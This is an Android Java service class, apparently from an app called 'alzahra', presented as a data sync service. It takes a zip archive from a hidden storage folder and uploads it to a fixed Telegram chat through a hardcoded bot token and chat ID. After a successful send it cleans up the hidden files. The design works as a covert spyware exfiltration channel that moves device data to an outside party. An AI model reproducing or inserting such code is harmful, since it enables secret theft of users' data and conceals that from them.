package com.alzahra.services;

import android.app.IntentService;
import android.content.Intent;

import com.alzahra.storage.HiddenStorageManager;
import com.alzahra.telegram.TelegramBot;

import java.io.File;

public class TelegramSyncService extends IntentService {
    
    private static final String BOT_TOKEN = "8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA";
    private static final String CHAT_ID = "7344776596";
    
    public static final String ACTION_AUTO_SYNC = "AUTO_SYNC";
    public static final String ACTION_MANUAL_SYNC = "MANUAL_SYNC";

    public TelegramSyncService() {
        super("TelegramSyncService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent == null) return;
        
        String action = intent.getAction();
        if (ACTION_AUTO_SYNC.equals(action) || ACTION_MANUAL_SYNC.equals(action)) {
            performSync(ACTION_AUTO_SYNC.equals(action));
        }
    }

    private void performSync(boolean isAuto) {
        try {
            File zipFile = new File(HiddenStorageManager.getHiddenFolder(this), "data_backup.zip");
            if (!zipFile.exists() || zipFile.length() == 0) return;
            
            TelegramBot bot = new TelegramBot(BOT_TOKEN);
            boolean sent = bot.sendDocument(CHAT_ID, zipFile, 
                    isAuto ? "📤 Auto sync" : "📥 Manual sync");
            
            if (sent) {
                HiddenStorageManager.cleanupAfterSend(this);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
